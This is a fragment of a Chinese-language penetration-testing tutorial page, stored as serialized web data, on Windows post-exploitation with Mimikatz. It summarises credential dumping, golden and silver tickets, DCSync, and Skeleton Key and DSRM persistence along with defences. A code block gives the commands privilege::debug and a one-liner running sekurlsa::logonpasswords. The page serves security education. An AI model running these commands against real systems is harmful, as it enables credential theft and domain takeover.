61:["$","p",null,{"children":"Windows 后渗透是渗透测试中技术含量最高的阶段。本文详细讲解了以 Mimikatz 为核心的凭据提取和高级域攻击技术："}]
62:["$","ul",null,{"children":["\n",["$","li",null,{"children":[["$","strong",null,{"children":"凭据提取"}]," — ",["$","code",null,{"children":"sekurlsa::logonpasswords"}]," 和 ",["$","code",null,{"children":"lsadump::sam"}]," 是获取密码和 Hash 的核心命令"]}],"\n",["$","li",null,{"children":[["$","strong",null,{"children":"黄金票据"}]," — 通过 krbtgt Hash 伪造 TGT，实现域内任意资源的持久访问"]}],"\n",["$","li",null,{"children":[["$","strong",null,{"children":"白银票据"}]," — 伪造服务票据，针对特定服务进行隐蔽攻击"]}],"\n",["$","li",null,{"children":[["$","strong",null,{"children":"DCSync"}]," — 模拟域控复制提取所有域用户哈希，无需在 DC 上执行代码"]}],"\n",["$","li",null,{"children":[["$","strong",null,{"children":"持久化"}]," — Skeleton Key 和 DSRM 后门提供了域级别的持久访问"]}],"\n",["$","li",null,{"children":[["$","strong",null,{"children":"防御体系"}]," — Credential Guard、LAPS、Protected Users 构成多层防御"]}],"\n"]}]
63:["$","p",null,{"children":"这些技术在合法的渗透测试和红队评估中具有重要价值。在实际操作中，务必确保拥有明确的授权，并严格控制测试范围。掌握攻击技术的最终目的是理解风险，从而更好地防御。"}]
2d:["$","div",null,{"className":"code-block-wrapper relative group my-6","children":[["$","$L64",null,{"text":":: 运行 Mimikatz（需要管理员权限）\nmimikatz.exe\n\n:: 提升到调试权限（必须先执行）\nmimikatz # privilege::debug\n:: 输出: Privilege '20' OK — 表示成功\n\n:: 检查 Mimikatz 版本\nmimikatz # version\n\n:: 单行命令执行（自动化场景）\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n"}],["$","pre",null,{"className":"!m-0","children":["$","code",null,{"className":"language-cmd","children":":: 运行 Mimikatz（需要管理员权限）\nmimikatz.exe\n\n:: 提升到调试权限（必须先执行）\nmimikatz # privilege::debug\n:: 输出: Privilege '20' OK — 表示成功\n\n:: 检查 Mimikatz 版本\nmimikatz # version\n\n:: 单行命令执行（自动化场景）\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n"}]}]]}]
